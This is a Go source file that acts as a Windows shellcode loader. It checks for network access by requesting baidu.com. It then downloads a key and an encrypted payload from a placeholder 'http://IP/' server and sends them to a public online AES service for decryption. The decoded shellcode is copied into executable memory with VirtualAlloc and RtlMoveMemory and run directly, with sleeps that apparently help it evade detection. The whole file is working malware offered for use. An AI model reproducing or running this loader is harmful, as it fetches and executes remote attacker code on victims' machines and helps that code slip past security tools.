package main

import (
	"encoding/base64"
	"fmt"
	"syscall"
	"time"
	"unsafe"
	"net/http"
	"net/url"
	"io/ioutil"
	"strings"
)

var (
	kernel32     = syscall.NewLazyDLL("kernel32.dll")
	VirtualAlloc = kernel32.NewProc("VirtualAlloc")
	RtlMoveMemory = kernel32.NewProc("RtlMoveMemory")
	URI           = "http://IP/"
	key string
	exp string
	shellcode string

)

func Getkey() string {
  time.Sleep(5 * time.Second)
  resp, _ := http.Get(URI + "key.txt")
    defer resp.Body.Close()
    body, _ := ioutil.ReadAll(resp.Body)
    var k = string(body)
    return k

}


func GetExp() string {
 time.Sleep(5 * time.Second)
 resp, _ := http.Get(URI + "exp.txt")
 	defer resp.Body.Close()
 	body, _ := ioutil.ReadAll(resp.Body)
 	var e = string(body)
    return e

}



func decrypt() string {
	Data := make(url.Values)
	Data.Add("data",exp)
	Data.Add("type","aes")
	Data.Add("arg","m=ecb_pad=zero_block=128_p="+key+"_i=10_o=0_s=gb2312_t=1")
	payload := Data.Encode()
	time.Sleep(5 * time.Second)
    resp, err := http.Post("http://tool.chacuo.net/cryptaes",
    	"application/x-www-form-urlencoded; charset=UTF-8",
        strings.NewReader(payload))

    if err != nil {
        fmt.Println(err)
    }
 
	defer resp.Body.Close()
    body, err := ioutil.ReadAll(resp.Body)
    if err != nil {
        // handle error
    }
    shell := string(body)
    content := shell[33 : len(shell)-3]
    return content
}



func build(code string){
 	str := strings.Replace(code, "\\/", "/", -1)
 	sDec,_ := base64.StdEncoding.DecodeString(str)
// 	fmt.Println(str)
	addr, _, _ := VirtualAlloc.Call(0, uintptr(len(sDec)), 0x1000|0x2000, 0x40)
	_, _, _ = RtlMoveMemory.Call(addr, (uintptr)(unsafe.Pointer(&sDec[0])), uintptr(len(sDec)))
	syscall.Syscall(addr, 0, 0, 0, 0)

}


func main() {
	u, _ := url.Parse("http://www.baidu.com/")
	q := u.Query()
	u.RawQuery = q.Encode()
	res, err := http.Get(u.String())
	if err != nil {
		return
	}
	resCode := res.StatusCode
	res.Body.Close()
	if err != nil {
		return
	}
	var y int = 200
	if resCode == y {

    key = Getkey()
    exp = GetExp()
    shellcode = decrypt()
// 	fmt.Println(shellcode)   
    build(shellcode)
	

	
	}
}
